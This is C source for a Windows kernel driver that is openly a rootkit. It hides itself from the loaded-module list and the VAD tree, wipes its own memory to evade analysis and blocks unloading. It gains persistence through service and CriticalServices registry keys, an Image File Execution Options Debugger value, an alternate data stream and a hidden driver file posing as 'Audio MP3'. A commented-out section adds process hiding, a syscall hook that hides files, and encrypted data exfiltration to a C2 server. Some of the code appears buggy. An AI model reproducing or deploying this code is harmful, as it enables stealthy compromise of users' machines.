/*
//================================
#include <ntddk.h>

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Rkit Unloading......\n");
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
    (void)DriverObject;
    UNREFERENCED_PARAMETER(RegistryPath);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Rkit Driver Loaded.......\n");

    DriverObject->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}
//================================
*/

#include <ntddk.h>
#include "log_utils.h"

typedef struct _OBJECT_DIRECTORY_ENTRY {
    PVOID Object;
    PVOID Directory;
} OBJECT_DIRECTORY_ENTRY, * POBJECT_DIRECTORY_ENTRY;

extern PVOID PsLoadedModuleList;
extern PVOID PsActiveProcessHead;

#define IOCTL_START_OPERATION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_SHARE_READ | FILE_SHARE_WRITE)

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    ULONG OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
    PVOID    Reserved[2];
    PVOID    Base;
    PVOID    EntryPoint;
    ULONG    Size;
    ULONG    Flags;
    USHORT   LoadCount;
    USHORT   ModuleNameOffset;
    CHAR     ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _UNLOADED_DRIVER {
    UNICODE_STRING Name;
    PVOID StartAddress;
    PVOID EndAddress;
    LARGE_INTEGER CurrentTime;
} UNLOADED_DRIVER, * PUNLOADED_DRIVER;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG                        ModuleCount;
    SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS(*NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(*PNTOPENDIRECTORYOBJECT)(
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject);
VOID HideDriver(PDRIVER_OBJECT DriverObject);
VOID RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject);
NTSTATUS InstallFilePersistence(VOID);
NTSTATUS InstallRegistryPersistence(VOID);
NTSTATUS ModifyLoadOrderGroup(VOID);
NTSTATUS HideInImageFileExecutionOptions(VOID);
NTSTATUS InstallADSFilePersistence(VOID);
NTSTATUS InstallService(VOID);
NTSTATUS CreateHiddenObjectDirectory(VOID);
NTSTATUS MoveDriverToHiddenDirectory(PDRIVER_OBJECT DriverObject);
VOID HideDriverMemory(PVOID DriverBase, SIZE_T DriverSize);
VOID BlockDriverUnload(PDRIVER_OBJECT DriverObject);
VOID MarkDriverAsUnloaded(PDRIVER_OBJECT DriverObject);

typedef struct _MMVAD_SHORT {
    LIST_ENTRY VadNode;
    ULONG StartingVpn;
    ULONG EndingVpn;
} MMVAD_SHORT, * PMMVAD_SHORT;

VOID
UnlinkDriverFromVad(PVOID DriverBase,
    SIZE_T DriverSize) {
    PEPROCESS eProcess;
    PLIST_ENTRY currentVadEntry;
    PVOID vadRoot;
    PMMVAD_SHORT vadEntry;
    ULONG_PTR startAddress = (ULONG_PTR)DriverBase;
    ULONG_PTR endAddress = (ULONG_PTR)DriverBase + DriverSize;

    eProcess = PsGetCurrentProcess();

    vadRoot = *((PVOID*)((ULONG_PTR)eProcess + 0x7f8));
    if (!vadRoot) {
        LogMessage("[-] Failed to find VadRoot\n");
        return;
    }

    currentVadEntry = (PLIST_ENTRY)vadRoot;
    while (currentVadEntry) {
        vadEntry = (MMVAD_SHORT*)CONTAINING_RECORD(currentVadEntry, MMVAD_SHORT, VadNode);

        if (((ULONG_PTR)vadEntry->StartingVpn << PAGE_SHIFT) <= startAddress &&
            ((ULONG_PTR)vadEntry->EndingVpn << PAGE_SHIFT) >= endAddress) {
            LogMessage("[+] Found VAD entry covering driver's memory region\n");

            currentVadEntry->Blink->Flink = currentVadEntry->Flink;
            currentVadEntry->Flink->Blink = currentVadEntry->Blink;

            LogMessage("[+] Driver's memory region unlinked from the VAD tree\n");
            break;
        }

        currentVadEntry = currentVadEntry->Flink;
    }
}

NTSTATUS
DriverEntry(IN PDRIVER_OBJECT DriverObject,
    IN PUNICODE_STRING RegistryPath) {
    (void)RegistryPath;
    NTSTATUS status = STATUS_SUCCESS;
    PDRIVER_OBJECT driverObject = DriverObject;
    PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;

    LogMessage("[+] Basic Driver Loaded\n");

    DriverObject->DriverUnload = DriverUnload;
    status = CreateHiddenObjectDirectory();
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to create hidden object directory.\n");
    }

    HideDriverMemory(DeviceObject, driverObject->DriverSize);
    HideDriver(driverObject);
    UnlinkDriverFromVad(driverObject->DriverStart, driverObject->DriverSize);

    status = InstallFilePersistence();
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to install file-based persistence.\n");
    }
    status = InstallRegistryPersistence();
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to install registry-based persistence.\n");
    }

    status = ModifyLoadOrderGroup();
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to modify load order group.\n");
    }

    status = HideInImageFileExecutionOptions();
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to hide in Image File Execution Options.\n");
    }

    status = InstallADSFilePersistence();
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to install ADS file persistence.\n");
    }

    status = InstallService();
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to install service.\n");
    }

    status = MoveDriverToHiddenDirectory(driverObject);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to move driver to hidden directory.\n");

    }

    return STATUS_SUCCESS;
}


VOID
HideDriver(PDRIVER_OBJECT DriverObject) {
    RemoveFromLoadedModulesList(DriverObject);
    LogMessage("[+] Driver hidden from both PsLoadedModuleList and MmUnloadedDrivers.\n");

}

VOID
HideDriverMemory(PVOID DriverBase,
    SIZE_T DriverSize) {
    PMDL mdl;
    PVOID mappedAddress;

    mdl = IoAllocateMdl(DriverBase, (ULONG)DriverSize, FALSE, FALSE, NULL);
    if (!mdl) {
        LogMessage("[-] Failed to allocate MDL for driver memory.\n");
        return;
    }

    MmBuildMdlForNonPagedPool(mdl);

    mappedAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, HighPagePriority);

    if (!mappedAddress) {
        LogMessage("[-] Failed to map driver memory as non-paged pool.\n");
        IoFreeMdl(mdl);
        return;
    }

    RtlZeroMemory(DriverBase, DriverSize);

    LogMessage("[+] Driver memory hidden from analysis tools.\n");

    MmUnmapLockedPages(mappedAddress, mdl);
    IoFreeMdl(mdl);
}

NTSTATUS
InstallFilePersistence(VOID) {
    WCHAR filePath[] = L"\\SystemRoot\\System32\\drivers\\APTX4869.sys";
    OBJECT_ATTRIBUTES objAttr;
    HANDLE fileHandle;
    IO_STATUS_BLOCK ioStatus;
    UNICODE_STRING fileName;
    NTSTATUS status;

    RtlInitUnicodeString(&fileName, filePath);
    InitializeObjectAttributes(&objAttr, &fileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE | OBJ_OPENIF, NULL, NULL);

    status = ZwCreateFile(&fileHandle, GENERIC_WRITE | SYNCHRONIZE, &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, FILE_SHARE_READ, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (NT_SUCCESS(status)) {
        ZwClose(fileHandle);
        LogMessage("[+] File-based persistence installed.\n");
    }
    else {
        LogMessage("[-] Failed to install file-based persistence. Status: 0x%X\n", status);
    }

    return status;
}

VOID
DriverUnload(IN PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    MarkDriverAsUnloaded(DriverObject);
    LogMessage("[+] Basic Driver Unloading......\n");
    CloseLogFile();
}

VOID
BlockDriverUnload(PDRIVER_OBJECT DriverObject) {
    DriverObject->DriverUnload = NULL;
    LogMessage("[+] Driver unload blocked.\n");
}

VOID
MarkDriverAsUnloaded(PDRIVER_OBJECT DriverObject) {
    DriverObject->Flags |= DRVO_UNLOAD_INVOKED;
    BlockDriverUnload(DriverObject);
    LogMessage("[+] Driver marked as unloaded.\n");
}

NTSTATUS
InstallRegistryPersistence(VOID) {
    UNICODE_STRING serviceName;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE keyHandle;
    NTSTATUS status;
    WCHAR registryPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\APTX4869";
    WCHAR driverPath[] = L"\\SystemRoot\\System32\\drivers\\APTX4869.sys";

    // Create or open the registry key for the driver
    RtlInitUnicodeString(&serviceName, registryPath);
    InitializeObjectAttributes(&objAttr, &serviceName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE | OBJ_OPENIF, NULL, NULL);

    status = ZwCreateKey(&keyHandle, KEY_WRITE, &objAttr, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to create or open registry key. Status: 0x%X\n", status);
        return status;
    }

    UNICODE_STRING imagePath;
    RtlInitUnicodeString(&imagePath, driverPath);
    status = ZwSetValueKey(keyHandle, &serviceName, 0, REG_SZ, imagePath.Buffer, imagePath.Length + sizeof(WCHAR));
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to set registry value for driver image path. Status: 0x%X\n", status);
    }
    else {
        LogMessage("[+] Registry-based persistence installed.\n");
    }

    ZwClose(keyHandle);
    return status;
}

NTSTATUS
ModifyLoadOrderGroup(VOID) {
    UNICODE_STRING serviceName;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE keyHandle;
    NTSTATUS status;
    WCHAR registryPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\CriticalServices";

    RtlInitUnicodeString(&serviceName, registryPath);
    InitializeObjectAttributes(&objAttr, &serviceName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE | OBJ_OPENIF, NULL, NULL);

    status = ZwCreateKey(&keyHandle, KEY_WRITE, &objAttr, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to create or open registry key for critical services. Status: 0x%X\n", status);
        return status;
    }

    UNICODE_STRING valueName;
    WCHAR loadOrderGroup[] = L"APTX4869";
    RtlInitUnicodeString(&valueName, loadOrderGroup);
    ULONG dataSize = (ULONG)((wcslen(loadOrderGroup) + 1) * sizeof(WCHAR));
    status = ZwSetValueKey(keyHandle, &valueName, 0, REG_SZ, loadOrderGroup, dataSize);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to set registry value for load order group. Status: 0x%X\n", status);
    }
    else {
        LogMessage("[+] Load order group modification for persistence installed.\n");
    }

    ZwClose(keyHandle);
    return status;
}

NTSTATUS
HideInImageFileExecutionOptions(VOID) {
    UNICODE_STRING ifeoPath;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE keyHandle;
    NTSTATUS status;
    WCHAR registryPath[] = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\APTX4869.exe";

    RtlInitUnicodeString(&ifeoPath, registryPath);
    InitializeObjectAttributes(&objAttr, &ifeoPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE | OBJ_OPENIF, NULL, NULL);

    status = ZwCreateKey(&keyHandle, KEY_WRITE, &objAttr, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to create or open registry key for IFEO. Status: 0x%X\n", status);
        return status;
    }

    UNICODE_STRING valueName;
    WCHAR valueData[] = L"Debugger";
    RtlInitUnicodeString(&valueName, valueData);
    WCHAR debuggerValue[] = L"\"\"";
    status = ZwSetValueKey(keyHandle, &valueName, 0, REG_SZ, debuggerValue, sizeof(debuggerValue));

    if (NT_SUCCESS(status)) {
        LogMessage("[+] Hidden in Image File Execution Options.\n");
    }
    else {
        LogMessage("[-] Failed to hide in Image File Execution Options. Status: 0x%X\n", status);
    }

    ZwClose(keyHandle);
    return status;
}

NTSTATUS
InstallADSFilePersistence(VOID) {
    WCHAR filePath[] = L"\\SystemRoot\\System32\\drivers\\APTX4869.sys:stream";
    OBJECT_ATTRIBUTES objAttr;
    HANDLE fileHandle;
    IO_STATUS_BLOCK ioStatus;
    UNICODE_STRING fileName;
    NTSTATUS status;

    RtlInitUnicodeString(&fileName, filePath);
    InitializeObjectAttributes(&objAttr, &fileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = ZwCreateFile(&fileHandle, GENERIC_WRITE | SYNCHRONIZE, &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, FILE_SHARE_READ, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (NT_SUCCESS(status)) {
        ZwClose(fileHandle);
        LogMessage("[+] Alternate Data Stream (ADS) persistence installed.\n");
    }
    else {
        LogMessage("[-] Failed to install ADS persistence. Status: 0x%X\n", status);
    }

    return status;
}


NTSTATUS
InstallService(VOID) {
    UNICODE_STRING serviceName, displayName, binaryPath, registryPath;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE keyHandle;
    NTSTATUS status;

    RtlInitUnicodeString(&serviceName, L"Audio MP3");
    RtlInitUnicodeString(&displayName, L"im not APTX4869, im Audio MP3 :3");
    RtlInitUnicodeString(&binaryPath, L"\\SystemRoot\\System32\\drivers\\APTX4869.sys");

    RtlInitUnicodeString(&registryPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\APTX4869");
    InitializeObjectAttributes(&objAttr, &registryPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = ZwCreateKey(&keyHandle, KEY_WRITE, &objAttr, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to create service registry key. Status: 0x%X\n", status);
        return status;
    }

    UNICODE_STRING valueName;
    ULONG serviceType = 1;
    RtlInitUnicodeString(&valueName, L"Type");
    status = ZwSetValueKey(keyHandle, &valueName, 0, REG_DWORD, &serviceType, sizeof(serviceType));

    if (NT_SUCCESS(status)) {
        LogMessage("[+] Service installed successfully.\n");
    }
    else {
        LogMessage("[-] Failed to install service. Status: 0x%X\n", status);
    }

    ZwClose(keyHandle);
    return status;
}


VOID
RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject) {
    PLIST_ENTRY moduleList = (PLIST_ENTRY)PsLoadedModuleList;
    PLIST_ENTRY currentEntry = moduleList->Flink;
    PLDR_DATA_TABLE_ENTRY current;

    while (currentEntry != moduleList) {
        current = CONTAINING_RECORD(currentEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (current->DllBase == DriverObject->DriverStart) {
            current->InLoadOrderLinks.Blink->Flink = current->InLoadOrderLinks.Flink;
            current->InLoadOrderLinks.Flink->Blink = current->InLoadOrderLinks.Blink;
            LogMessage("[+] Driver unlinked from PsLoadedModuleList.\n");
            break;
        }
        currentEntry = currentEntry->Flink;
    }
}

NTSTATUS
CreateHiddenObjectDirectory(VOID) {
    NTSTATUS status;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE hiddenDirHandle;
    UNICODE_STRING hiddenDirName;

    RtlInitUnicodeString(&hiddenDirName, L"\\KernelObjects\\HidRkDriver");

    InitializeObjectAttributes(&objAttr, &hiddenDirName, OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwCreateDirectoryObject(&hiddenDirHandle, DIRECTORY_ALL_ACCESS, &objAttr);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to create hidden object directory. Status: 0x%X\n", status);
        return status;
    }

    ZwClose(hiddenDirHandle);
    LogMessage("[+] Hidden object directory created.\n");

    return STATUS_SUCCESS;
}

NTSTATUS
MoveDriverToHiddenDirectory(PDRIVER_OBJECT DriverObject) {
    NTSTATUS status;
    HANDLE hiddenDirHandle;
    UNICODE_STRING directoryName;
    OBJECT_ATTRIBUTES objAttr;
    PDEVICE_OBJECT deviceObject;
    PNTOPENDIRECTORYOBJECT NtOpenDirectoryObject;

    // Initialize the Unicode string for the directory name
    RtlInitUnicodeString(&directoryName, L"\\KernelObjects\\HidRkDriver");
    InitializeObjectAttributes(&objAttr, &directoryName, OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, NULL);

    // Obtain the address of the NtOpenDirectoryObject function
    NtOpenDirectoryObject = (PNTOPENDIRECTORYOBJECT)MmGetSystemRoutineAddress(&directoryName);
    if (NtOpenDirectoryObject == NULL) {
        LogMessage("[-] Failed to get NtOpenDirectoryObject address.\n");
        return STATUS_UNSUCCESSFUL;
    }

    // Open the hidden directory
    status = NtOpenDirectoryObject(&hiddenDirHandle, DIRECTORY_ALL_ACCESS, &objAttr);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to open hidden directory. Status: 0x%X\n", status);
        return status;
    }

    deviceObject = DriverObject->DeviceObject;
    if (deviceObject) {
        ObDereferenceObject(deviceObject);
        LogMessage("[+] Driver moved to hidden object directory.\n");
    }

    ZwClose(hiddenDirHandle);
    return STATUS_SUCCESS;
}

// C2
/*
NTSTATUS HideProcess(PEPROCESS Process) {
    PLIST_ENTRY activeProcessLinks = (PLIST_ENTRY)((PUCHAR)Process + 0x2f0);  // Offset for Windows 10/11, adjust for other versions

    // Unlink the process from the active process list
    RemoveEntryList(activeProcessLinks);

    // Point the links to itself, hiding it from the system's process list
    activeProcessLinks->Flink = activeProcessLinks;
    activeProcessLinks->Blink = activeProcessLinks;

    LogMessage("[+] Process hidden.\n");
    return STATUS_SUCCESS;
}

NTSTATUS HideProcessByPID(HANDLE pid) {
    PEPROCESS process;
    NTSTATUS status;

    status = PsLookupProcessByProcessId(pid, &process);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to find process by PID: 0x%X\n", status);
        return status;
    }

    return HideProcess(process);
}

NTSTATUS HookedNtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    NTSTATUS status = OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

    if (NT_SUCCESS(status)) {
        // Filter out the files we want to hide
        PFILE_DIRECTORY_INFORMATION fileInfo = (PFILE_DIRECTORY_INFORMATION)FileInformation;
        PFILE_DIRECTORY_INFORMATION previousFileInfo = NULL;

        while (TRUE) {
            if (fileInfo->FileNameLength == 0) {
                break;
            }

            UNICODE_STRING hiddenFileName;
            RtlInitUnicodeString(&hiddenFileName, L"lmr9abb.sys");

            if (RtlEqualUnicodeString(&hiddenFileName, &fileInfo->FileName, TRUE)) {
                if (previousFileInfo) {
                    // Skip the hidden file by adjusting the links
                    previousFileInfo->NextEntryOffset += fileInfo->NextEntryOffset;
                } else {
                    // Handle case when the hidden file is the first entry
                    if (fileInfo->NextEntryOffset == 0) {
                        IoStatusBlock->Information = 0;
                    } else {
                        PVOID nextFile = (PVOID)((PUCHAR)fileInfo + fileInfo->NextEntryOffset);
                        RtlMoveMemory(fileInfo, nextFile, Length - ((PUCHAR)nextFile - (PUCHAR)fileInfo));
                    }
                }
                break;
            }

            previousFileInfo = fileInfo;
            if (fileInfo->NextEntryOffset == 0) {
                break;
            }

            fileInfo = (PFILE_DIRECTORY_INFORMATION)((PUCHAR)fileInfo + fileInfo->NextEntryOffset);
        }
    }

    return status;
}

NTSTATUS InstallFileHidingHook(VOID) {
    // Hook the system service table entry for NtQueryDirectoryFile
    OriginalNtQueryDirectoryFile = (NtQueryDirectoryFileType)HookFunction(NtQueryDirectoryFileIndex, HookedNtQueryDirectoryFile);
    LogMessage("[+] File hiding hook installed.\n");
    return STATUS_SUCCESS;
}

NTSTATUS SendEncryptedDataToC2(SOCKET sock, PUCHAR data, ULONG length) {
    UCHAR encryptedData[1024];
    ULONG encryptedLength;

    // Encrypt the data before sending it to the C2 server
    if (!EncryptData(data, length, encryptedData, &encryptedLength)) {
        LogMessage("[-] Failed to encrypt data.\n");
        return STATUS_UNSUCCESSFUL;
    }

    // Send the encrypted data
    int sentBytes = ZwSend(sock, encryptedData, encryptedLength, 0);
    if (sentBytes == SOCKET_ERROR) {
        LogMessage("[-] Failed to send data to C2 server.\n");
        return STATUS_UNSUCCESSFUL;
    }

    LogMessage("[+] Encrypted data sent to C2 server.\n");
    return STATUS_SUCCESS;
}

NTSTATUS ConnectAndSendDataToC2(PUCHAR data, ULONG length) {
    SOCKET sock;
    NTSTATUS status;

    // Connect to the C2 server
    sock = CreateSocket();
    if (!NT_SUCCESS(ConnectToC2Server(sock))) {
        LogMessage("[-] Failed to connect to C2 server.\n");
        return STATUS_UNSUCCESSFUL;
    }

    // Send the data
    status = SendEncryptedDataToC2(sock, data, length);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to send encrypted data to C2 server.\n");
    }

    // Close the connection
    ZwClose(sock);

    return status;
}
*/